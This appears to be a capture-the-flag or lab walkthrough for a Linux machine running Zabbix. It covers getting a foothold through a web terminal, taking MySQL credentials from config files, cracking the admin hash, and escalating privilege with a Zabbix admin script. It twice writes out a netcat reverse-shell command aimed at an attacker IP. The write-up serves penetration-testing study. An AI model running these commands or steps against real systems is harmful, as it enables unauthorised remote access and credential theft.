# Zab Walkthrough (Linux)

## Initial Foothold

- Open ports: 22, 80, 6789
- Port **6789** has a terminal (CLI GUI) that allows remote command execution via the web interface.
- Obtained reverse shell using:
  ```bash
  busybox nc 192.168.45.194 22 -e bash
  ```
- Port **80** served a web application called **Zabbix**.
- Ran `linpeas.sh` and found that Zabbix runs via:
  - `/usr/sbin/zabbix*`
  - `/etc/zabbix/*`
- Retrieved MySQL credentials from Zabbix config files and accessed the MySQL service.
- Found **Admin credentials**, cracked the hash.
- Discovered via `ss -tnlup` that ports `10050` and `10051` are open locally (Zabbix agent and server).
- Inspected `/etc/zabbix/apache.conf` and found `/usr/share/zabbix/ui/conf/maintenance.inc.php`.
- Using this insight, setup **Ligolo** proxy.
- Accessed Zabbix login portal via port 80 + proxy and authenticated as **Admin**.

## Privilege Escalation

- In Zabbix web portal:
  - Go to `Administration → Scripts`
  - Created a new script to run:
    ```bash
    busybox nc 192.168.45.194 22 -e bash
    ```
  - Navigate to `Monitoring → Hosts`
  - Selected target, then `Scripts`, and ran the reverse shell payload.
